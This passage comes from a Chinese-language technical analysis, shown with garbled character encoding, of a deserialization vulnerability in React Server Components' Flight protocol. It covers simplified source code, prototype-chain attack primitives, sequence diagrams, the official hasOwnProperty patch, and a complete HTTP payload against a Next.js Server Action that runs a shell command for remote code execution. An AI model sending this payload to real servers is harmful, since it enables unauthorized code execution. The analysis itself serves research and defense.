                // Blob å¤„ç† âš ï¸ æ”»å‡»åˆ©ç”¨ç‚¹
                var id = parseInt(value.slice(2), 16);
                return response._formData.get(response._prefix + id);
            // ... å…¶ä»–ç±»å‹
            default:
                // é“¾å¼å¼•ç”¨: "$1:key1:key2"
                var ref = value.slice(1);
                var colonIdx = ref.indexOf(':');
                if (colonIdx > -1) {
                    var id = parseInt(ref.slice(0, colonIdx), 16);
                    var path = ref.slice(colonIdx + 1);
                    var chunk = getChunk(response, id);
                    // âš ï¸ æ¼æ´: ç›´æ¥è®¿é—®å±æ€§é“¾ï¼Œæ—  hasOwnProperty æ£€æŸ¥
                    return loadServerReference(chunk, path);
                }
                return getChunk(response, parseInt(ref, 16));
        }
    }
    return value;
}
```

### æ¼æ´ç‚¹

1. `$` ä¸ `$@` çš„è§£æåŒºåˆ«:

```javascript
// å‡è®¾ Chunk 0 çš„åŸå§‹æ•°æ®æ˜¯: '{"name": "Alice"}'

// ===== "$0" - æ™®é€šå¼•ç”¨ =====
// è¿”å›è§£æåçš„ JavaScript å€¼
parseModelString("$0")
// æ‰§è¡Œæµç¨‹:
//   1. getChunk(0) â†’ Chunk å¯¹è±¡
//   2. å¦‚æœ status æ˜¯ "resolved_model"ï¼Œè°ƒç”¨ initializeModelChunk
//   3. è¿”å› chunk.value (è§£æåçš„å€¼)
// ç»“æœ: { name: "Alice" }  â† æ™®é€š JS å¯¹è±¡

// ===== "$@0" - åŸå§‹ Chunk å¼•ç”¨ =====
// è¿”å› Chunk å¯¹è±¡æœ¬èº«ï¼Œä¸è§£æ
parseModelString("$@0")
// æ‰§è¡Œæµç¨‹:
//   1. getChunk(0) â†’ Chunk å¯¹è±¡
//   2. ç›´æ¥è¿”å›ï¼ˆä¸è°ƒç”¨ initializeModelChunkï¼‰
// ç»“æœ:
ReactPromise {
    status: "resolved_model",
    value: '{"name": "Alice"}',
    reason: null,
    _response: Response {...},
    __proto__: ReactPromise.prototype  // âš ï¸ å¯è®¿é—®åŸå‹é“¾ï¼
}
```

`$@` è¿”å›çš„æ˜¯ä¸€ä¸ªå®Œæ•´çš„ Promise å¯¹è±¡, **åŒ…å« `__proto__`**;

> `Chunk.__proto__` - `ReactPromise.prototype`
>
> `Chunk.__proto__.then` - `ReactPromise.prototype.then`
>
> `Chunk.__proto__.constructor` = `Object` -> `Function`

2. `getChunk`

```javascript
function getChunk(response, id) {
    var chunks = response._chunks;
    var chunk = chunks.get(id);

    if (!chunk) {
        // æ³¨æ„, å¦‚æœ Chunk ä¸å­˜åœ¨ï¼Œå°è¯•ä» FormData è·å–
        var formData = response._formData;
        if (formData) {
            var data = formData.get(response._prefix + id);
            if (data != null) {
                // åˆ›å»º resolved_model çŠ¶æ€çš„ Chunk
                chunk = new ReactPromise(
                    "resolved_model",  // status
                    data,              // value (åŸå§‹ JSON å­—ç¬¦ä¸²)
                    id,                // reason (è¿™é‡Œå­˜ id)
                    response           // response
                );
            }
        }
        if (!chunk) {
            // åˆ›å»º pending çŠ¶æ€çš„ Chunk
            chunk = createPendingChunk(response);
        }
        chunks.set(id, chunk);
    }
    return chunk;
}
```

å¯ä»¥ä»åŒ…é‡Œç›´æ¥æ„é€  Chunk; data æ˜¯å®Œå…¨å¯æ§çš„;

3. `initializeModelChunk` 

```javascript
function initializeModelChunk(chunk) {
    var response = chunk._response;
    var value = chunk.value;  // åŸå§‹ JSON å­—ç¬¦ä¸²

    try {
        // è§£æ JSONï¼Œè¿‡ç¨‹ä¸­å¤„ç† $ å¼•ç”¨
        var parsed = parseModel(response, value);

        // æ›´æ–° Chunk çŠ¶æ€
        chunk.status = "fulfilled";
        chunk.value = parsed;
    } catch (error) {
        chunk.status = "rejected";
        chunk.reason = error;
    }
}
```

åˆ©ç”¨ `$` æ‰§è¡Œç‰¹æ®Šå¤„ç†å³å¯, æ”»å‡»è€…é€šè¿‡ FormData æä¾›çš„æ•°æ®ä¼šè¢«ç›´æ¥ç”¨äºåˆ›å»º Chunkï¼Œdata å‚æ•°å®Œå…¨å¯æ§ã€‚

4. `ReactPromise.prototype.then` - thenable æ¥å£

```javascript
ReactPromise.prototype.then = function(resolve, reject) {
    var chunk = this;

    switch (chunk.status) {
        case "fulfilled":
            // å·²è§£æï¼Œç›´æ¥è¿”å›å€¼
            if (resolve) resolve(chunk.value);
            break;

        case "pending":
        case "blocked":
            // ç­‰å¾…ä¸­ï¼Œæ³¨å†Œå›è°ƒ
            if (resolve) chunk.value.push(resolve);
            if (reject) chunk.reason.push(reject);
            break;

        case "resolved_model":
            // âš ï¸ å…³é”®: éœ€è¦è§£æ
            initializeModelChunk(chunk);
            // è§£æåé€’å½’å¤„ç†
            if (chunk.status === "fulfilled") {
                if (resolve) resolve(chunk.value);
            } else if (chunk.status === "rejected") {
                if (reject) reject(chunk.reason);
            }
            break;

        case "rejected":
            if (reject) reject(chunk.reason);
            break;
    }
};
```

æ³¨æ„: `then` æ–¹æ³•ä¼šåœ¨ä¸€ä¸ª thenable å¯¹è±¡è¢« `await` ä½¿è§¦å‘, è¿›ä¸€æ­¥åªè¦åœ¨æ„é€  chunk æ—¶ç¼–è¾‘å…¶çŠ¶æ€ä¸º `resolved_model`, å³å¯è§¦å‘è§£æ;

ä»è¿™ä¸€æ­¥å¼€å§‹è¿›å…¥äº† Promise (Thenable) å¯¹è±¡çš„é“¾å¼è§£æ, åªè¦æœ‰ä¸€å¤„å®Œæˆæ³¨å…¥, ç†è®ºä¸Šåç»­å†…å®¹å…¨éƒ¨å¯ä»¥æ³¨å…¥;

### react-server-dom-webpack  åŒ…

```javascript
// ç®€åŒ–çš„æ¼æ´ä»£ç 
function loadServerReference(chunk, path) {
    // path = "key1:key2:key3"
    var keys = path.split(':');
    var value = chunk.value;  // èµ·å§‹å€¼

    for (var i = 0; i < keys.length; i++) {
        var key = keys[i];
        // âš ï¸ æ¼æ´: ç›´æ¥ä½¿ç”¨æ–¹æ‹¬å·è®¿é—®
        // æ²¡æœ‰æ£€æŸ¥ key æ˜¯å¦æ˜¯å¯¹è±¡è‡ªèº«å±æ€§
        value = value[key];
    }

    return value;
}
```

## æ”»å‡»é“¾

æœåŠ¡å™¨åœ¨å¤„ç† Flight è¯·æ±‚æ—¶ä¼šæŒ‰é¡ºåºè§£æå®¢æˆ·ç«¯æä¾›çš„ chunk mapã€‚ç”±äº chunk ID ä¸ chunk value å‡å®Œå…¨ç”±å®¢æˆ·ç«¯æ§åˆ¶, è€ƒè™‘è¿™ä¸ªæ„é€ :

```javascript
chunk1 = "$@0"
chunk0 = { then: payload }
```


`$@0` ä¼šä»¤æœåŠ¡å™¨å°† `chunk1` çš„å€¼è§£æä¸º `chunk0` (thenable) å¯¹è±¡æœ¬èº«
React Flight è§£æå™¨åœ¨è§£å¼•ç”¨æ—¶ä¼šè‡ªåŠ¨æ‰§è¡Œ: 

```javascript
chunk0.then(resolve, reject)
```

æœ€ç»ˆè§¦å‘ payload ä¸­æ¤å…¥çš„ä»»æ„é€»è¾‘; é…åˆä¸Š `__proto__` çš„ç»„åˆæ‹³, å°±å¯ä»¥å®ŒæˆåŸå‹é“¾æ±¡æŸ“;

### æ”»å‡»åŸè¯­

| é”®è·¯å¾„                               | å€¼                     | ä½œç”¨æè¿°                    |
| ------------------------------------ | ---------------------- | --------------------------- |
| `$1:__proto__:then`                  | `Chunk.prototype.then` | è®©ä¼ªé€ å¯¹è±¡æˆä¸ºåˆæ³• thenable |
| `$1:constructor:constructor`         | `Function`             | åŠ¨æ€åˆ›å»ºå¹¶æ‰§è¡Œä»£ç           |
| `$1:__proto__:constructor`           | `Object`               | è·å– Object æ„é€ å‡½æ•°        |
| `$1:__proto__:constructor:prototype` | `Object.prototype`     | è®¿é—®æ‰€æœ‰å¯¹è±¡çš„åŸå‹          |


### æ”»å‡»å›¾ç¤º

#### åŸºæœ¬æµç¨‹

```mermaid
sequenceDiagram
    participant C as å®¢æˆ·ç«¯ï¼ˆæ”»å‡»è€…ï¼‰
    participant S as React Serverï¼ˆFlight Parserï¼‰
    participant T as Chunk Table

    C->>S: å‘é€ chunk map<br/>1="$@0"<br/>0={then: payload}
    S->>T: å†™å…¥ chunk1="$@0"<br/>chunk0=thenable
    S->>S: è§£æ chunk1 â†’ $@0
    S->>T: å–å‡º chunk0ï¼ˆåŸå§‹å¯¹è±¡ï¼‰
    S->>S: æ£€æµ‹åˆ° chunk0.then å­˜åœ¨
    S->>T: æ‰§è¡Œ chunk0.then(resolve, reject)
    T->>S: payload æ‰§è¡Œï¼ˆåŸå‹é“¾æ±¡æŸ“ / RCEï¼‰
    S->>C: è¿”å›è¢«æ”»å‡»åçš„å“åº”
```

#### HTTP æ”»å‡» payload ç¤ºä¾‹

```http
POST / HTTP/1.1
Host: vulnerable-nextjs-app.com
Content-Type: multipart/form-data; boundary=----FormBoundary
Next-Action: x

------FormBoundary
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"throw new Error(require('child_process').execSync('id').toString());","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------FormBoundary
Content-Disposition: form-data; name="1"

"$@0"
------FormBoundary
Content-Disposition: form-data; name="2"

[]
------FormBoundary--
```

#### æºä»£ç å±‚é¢çš„å®Œæ•´æµç¨‹

1. é¢„è®¤è¯ååºåˆ—åŒ–é“¾

```mermaid
sequenceDiagram
    autonumber
    participant C as å®¢æˆ·ç«¯
    participant A as Next.js<br>handleAction
    participant F as Flight<br>decodeReply
    participant G as getChunk(0)
    participant R as ReactPromise(Chunk0)

    C->>A: POST /\nHeader: next-action: x\nBody: FormData(chunks)
    A->>A: å‘ç°æ˜¯ Server Action è¯·æ±‚
    A->>F: decodeReplyFromBusboy(formData)

    F->>G: getChunk(0)
    G->>G: ä» FormData è¯»å– chunk0.value = æ¶æ„ JSON
    G->>R: åˆ›å»º ReactPromise(status="resolved_model")
    R-->>F: è¿”å› Chunk0
    F-->>A: è¿”å› Chunk0 (thenable)

    A->>R: await Chunk0<br>â‡’ è°ƒç”¨ Chunk0.then(resolve, reject)
```

2. ç¬¬ä¸€æ¬¡ then é“¾ (è§£æ `$1:__proto__:then`)

```mermaid
sequenceDiagram
    autonumber
    participant R0 as Chunk0
    participant INIT as initializeModelChunk
    participant PARSE as parseModel
    participant STR as parseModelString
    participant G1 as getChunk(1)
    participant R1 as Chunk1

    R0->>INIT: ReactPromise.prototype.then()
    INIT->>PARSE: parseModel(æ¶æ„ JSON)
    PARSE->>STR: è§£æ "$1:__proto__:then"

    STR->>G1: getChunk(1)
    G1->>R1: è§£æ "$@0" â†’ è¿”å› Chunk0 æœ¬èº«

    STR->>STR: éå† "__proto__" â†’ ReactPromise.prototype
    STR->>STR: è·å– "then" â†’ ReactPromise.prototype.then

    STR-->>PARSE: è¿”å›çœŸæ­£çš„ then æ–¹æ³•
    PARSE-->>INIT: è¿”å› fakeChunkï¼ˆä¼ªé€ å¯¹è±¡ï¼‰
    INIT-->>R0: chunk0.value = fakeChunk

    R0->>R0: await fakeChunk<br>â‡’ å†æ¬¡è°ƒç”¨ ReactPromise.prototype.then
```

3. ç¬¬äºŒæ¬¡ then é“¾ (è§£æ `$B1337` -> function)

```mermaid
sequenceDiagram
    autonumber
    participant F0 as fakeChunk
    participant INIT as initializeModelChunk
    participant PARSE as parseModel
    participant STR as parseModelString
    participant FD as fakeChunk._response._formData
    participant FN as Function æ„é€ å‡½æ•°

    F0->>INIT: ReactPromise.prototype.then.call(fakeChunk)
    INIT->>PARSE: parseModel('{"then":"$B1337"}')

    PARSE->>STR: è§£æ "$B1337"

    STR->>FD: _formData.get(prefix + "1337")
    FD->>FN: Function("æ¶æ„ä»£ç ...")

    FN-->>STR: è¿”å›æ¶æ„å‡½æ•° maliciousFunction
    STR-->>PARSE: è¿”å› { then: maliciousFunction }
    PARSE-->>INIT: åˆå§‹åŒ–å®Œæˆ

    F0->>F0: await result<br>â‡’ result.then(resolve, reject)
```

4. æœ€ç»ˆ RCE - Function æ‰§è¡Œ

```mermaid
sequenceDiagram
    autonumber
    participant RES as result({then: maliciousFunction})
    participant MF as maliciousFunction
    participant OS as Node.js child_process

    RES->>MF: await result â‡’ è°ƒç”¨ maliciousFunction()
    MF->>OS: execSync("id")
    OS-->>MF: è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœ
    MF-->>RES: throw Error(å‘½ä»¤è¾“å‡º)
```

æ³¨æ„è¿™ä¸ªæµç¨‹ä¸­ React **å…ˆååºåˆ—åŒ–** Flight payload, å†éªŒè¯ next-action (Action ID), è€Œåˆšåˆšçš„åˆ†æä¸­å·²ç»æŒ‡å‡ºè¿™ä¸ªåºåˆ—åŒ–æ˜¯ä¸å®‰å…¨çš„, å› æ­¤æœåŠ¡å™¨å°†å¯èƒ½è§£ææ¶æ„ chunkã€‚

åœ¨æ­¤åŸºç¡€ä¸Š, åˆ©ç”¨ **`$@` è‡ªå¼•ç”¨ + åŸå‹é“¾è·¯å¾„ç©¿é€** çš„ç»„åˆæ‹³æœ€ç»ˆæ‹¿ä¸‹ RCEã€‚

## è¡¥ä¸/ä¿®å¤

å¯¹ç°æœ‰ React çš„æœ€ä½³ä¿®å¤æ–¹æ¡ˆæ˜¯ç«‹åˆ»æ¢å¤å¿«ç…§, ç„¶åæ›´æ–°åˆ°æœ€æ–°çš„è¡¥ä¸ç‰ˆæœ¬;

### å®˜æ–¹è¡¥ä¸ä¿®å¤ç‚¹

æœ€å…³é”®çš„ä¿®å¤ç‚¹æ˜¯, æ·»åŠ  `hasOwnProperty` æ£€æŸ¥:

```diff
// packages/react-server-dom-webpack/src/ReactFlightServerReference.js

function requireModule(metadata) {
    var moduleExports = __webpack_require__(metadata[ID]);

-   return moduleExports[metadata[NAME]];
+   if (hasOwnProperty.call(moduleExports, metadata[NAME])) {
+       return moduleExports[metadata[NAME]];
+   }
+   return undefined;
}

// ç±»ä¼¼çš„ä¿®å¤åº”ç”¨äºå±æ€§è®¿é—®çš„å…¶ä»–ä½ç½®
function getProperty(obj, key) {
-   return obj[key];
+   if (hasOwnProperty.call(obj, key)) {
+       return obj[key];
+   }
+   return undefined;
}
```

`hasOwnProperty` ä¼šå¼ºåˆ¶ç”¨æˆ·åªèƒ½è®¿é—®å¯¹è±¡æœ¬èº«çš„å­—æ®µ, è€Œé**ç»§æ‰¿ (extends) çš„å±æ€§**, `constructor`, `__proto__`, `toString` ç­‰å¤§é‡é¢„ç•™å±æ€§éƒ½å±äºç»§æ‰¿; 

## æ€»ç»“

React2Shell åˆ©ç”¨ Flight ååºåˆ—åŒ–å¯¹ç”¨æˆ·å¯æ§ Chunk çš„é“¾å¼è®¿é—®ç¼ºä¹é™åˆ¶,æ”»å‡»è€…å¯é€šè¿‡ `$@` è·å–ä»»æ„ Chunk å¯¹è±¡å¹¶æ±¡æŸ“åŸå‹é“¾. ä¼ªé€ å¸¦æ¶æ„ then çš„ thenable. ä½¿æœåŠ¡å™¨åœ¨è§£æ Promise-like æ—¶æ‰§è¡Œä»»æ„ä»£ç , ä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

## å‚è€ƒåšå®¢/æ–‡ç« 

- [ç¦»åˆ«æ­Œ](https://www.leavesongs.com/) 

- [CVE-2025-55182 React Server Components ååºåˆ—åŒ–æ¼æ´åŸç†æ·±åº¦åˆ†æ](https://rustlang.rs/posts/CVE-2025-55182/#231-http-%E8%AF%B7%E6%B1%82%E7%BB%93%E6%9E%84)



>
> **ğŸ“„ å…è´£å£°æ˜**ï¼š
> -  æœ¬æ–‡æ‰€æ¶‰åŠçš„å®‰å…¨æŠ€æœ¯ã€æ¼æ´åˆ†æåŠç›¸å…³ç¤ºä¾‹ä»…ç”¨äºç½‘ç»œå®‰å…¨ç ”ç©¶ã€æ•™è‚²ä¸é˜²å¾¡ç›®çš„ã€‚è¯·å‹¿åœ¨æœªæˆæƒçš„ç³»ç»Ÿã€è®¾å¤‡æˆ–ç¯å¢ƒä¸­å¤ç°ã€åˆ©ç”¨æˆ–ä¼ æ’­æ–‡ä¸­ä»»ä½•æŠ€æœ¯ç»†èŠ‚ã€‚
> - ä»»ä½•åŸºäºæœ¬æ–‡å†…å®¹ä»äº‹çš„è¿æ³•è¡Œä¸ºå‡ä¸ä½œè€…æ— å…³ï¼Œç”±è¡Œä¸ºäººè‡ªè¡Œæ‰¿æ‹…å…¨éƒ¨æ³•å¾‹è´£ä»»ã€‚è¯·ä¸¥æ ¼éµå®ˆç›¸å…³æ³•å¾‹æ³•è§„ï¼Œåˆç†åˆæ³•åœ°ä½¿ç”¨æœ¬æ–‡ä¿¡æ¯ï¼Œä»¥ä¿ƒè¿›æ›´å®‰å…¨çš„æŠ€æœ¯ç”Ÿæ€ã€‚